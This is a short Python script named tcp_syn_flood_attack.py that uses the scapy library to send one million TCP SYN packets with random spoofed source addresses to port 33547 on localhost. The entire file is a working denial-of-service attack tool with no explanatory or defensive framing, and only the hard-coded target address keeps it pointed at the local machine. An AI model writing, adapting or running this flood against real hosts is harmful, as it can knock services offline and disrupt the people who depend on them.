# tcp_syn_flood_attack.py

from random import randint
from sys import stdout
from scapy.layers.inet import IP, TCP
from scapy.all import *

def tcp_syn_flood_attack():
    target_ip = '127.0.0.1'
    target_port = 33547

    for _ in range(1000000):
        ip_packet = IP(src=RandIP(), dst=target_ip)
        tcp_packet = TCP(sport=RandShort(), dport=target_port, flags='S')
        send(ip_packet/tcp_packet)

if __name__ == "__main__":
    tcp_syn_flood_attack()
